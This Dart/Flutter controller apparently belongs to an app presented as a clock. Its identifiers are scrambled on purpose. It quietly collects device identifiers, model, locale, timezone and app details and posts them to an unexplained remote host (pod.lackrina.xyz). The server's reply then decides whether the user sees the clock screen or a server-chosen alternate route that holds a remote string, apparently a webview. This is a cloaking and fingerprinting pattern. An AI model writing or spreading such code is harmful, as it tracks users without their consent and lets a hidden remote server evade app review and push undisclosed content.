import 'dart:convert';
import 'dart:io';

import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter/services.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

void bjbavbiun() async {
  var connectResult = await (Connectivity().checkConnectivity());
  if(connectResult == ConnectivityResult.none){
    Get.toNamed("/reload");
  }
}

class PageLogic extends GetxController {

  var pyltokud = RxBool(false);
  var ndyrcafm = RxBool(true);
  var evatwsgu = RxString("");
  var ethan = RxBool(false);
  var hill = RxBool(true);
  final uezlxqykpv = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    bjbavbiun();
    super.onInit();
    yhejma();
  }


  Future<void> yhejma() async {

    ethan.value = true;
    hill.value = true;
    ndyrcafm.value = false;

    uezlxqykpv.post("https://pod.lackrina.xyz/SMTUDWWXKR",data: await dzjftwimyn()).then((value) {
      var xzpunw = value.data["xzpunw"] as String;
      var lgrds = value.data["lgrds"] as bool;
      if (lgrds) {
        evatwsgu.value = xzpunw;
        aliyah();
      } else {
        bashirian();
      }
    }).catchError((e) {
      ndyrcafm.value = true;
      hill.value = true;
      ethan.value = false;
    });
  }

  Future<Map<String, dynamic>> dzjftwimyn() async {
    final DeviceInfoPlugin fvlipr = DeviceInfoPlugin();
    PackageInfo xvfa_hgcvimzf = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var grkqp = Platform.localeName;
    var ylcw = currentTimeZone;

    var mrwgo = xvfa_hgcvimzf.packageName;
    var ehlrx = xvfa_hgcvimzf.version;
    var pkao = xvfa_hgcvimzf.buildNumber;

    var qzbdvpwn = xvfa_hgcvimzf.appName;
    var waucbeq = "";
    var ubav  = "";
    var adeleCassin = "";
    var edenGottlieb = "";
    var baileyWeber = "";
    var wilmerMohr = "";
    var magnoliaSchoen = "";
    var marianeWindler = "";
    var paytonGutkowski = "";

    var mxwcka = "";

    var ugrmxw = "";
    var wudyxobp = false;

    if (GetPlatform.isAndroid) {
      ugrmxw = "android";
      var onkqpwyts = await fvlipr.androidInfo;

      mxwcka = onkqpwyts.brand;

      waucbeq  = onkqpwyts.model;
      ubav = onkqpwyts.id;

      wudyxobp = onkqpwyts.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      ugrmxw = "ios";
      var batqpiycx = await fvlipr.iosInfo;
      mxwcka = batqpiycx.name;
      waucbeq = batqpiycx.model;

      ubav = batqpiycx.identifierForVendor ?? "";
      wudyxobp  = batqpiycx.isPhysicalDevice;
    }

    var res = {
      "qzbdvpwn": qzbdvpwn,
      "pkao": pkao,
      "mrwgo": mrwgo,
      "waucbeq": waucbeq,
      "ylcw": ylcw,
      "magnoliaSchoen" : magnoliaSchoen,
      "ubav": ubav,
      "baileyWeber" : baileyWeber,
      "grkqp": grkqp,
      "ugrmxw": ugrmxw,
      "wudyxobp": wudyxobp,
      "edenGottlieb" : edenGottlieb,
      "ehlrx": ehlrx,
      "wilmerMohr" : wilmerMohr,
      "adeleCassin" : adeleCassin,
      "mxwcka": mxwcka,
      "marianeWindler" : marianeWindler,
      "paytonGutkowski" : paytonGutkowski,

    };
    return res;
  }

  Future<void> bashirian() async {
    Get.offAllNamed("/clockMain");
  }

  Future<void> aliyah() async {
    Get.offAllNamed("/clock_up");
  }

}
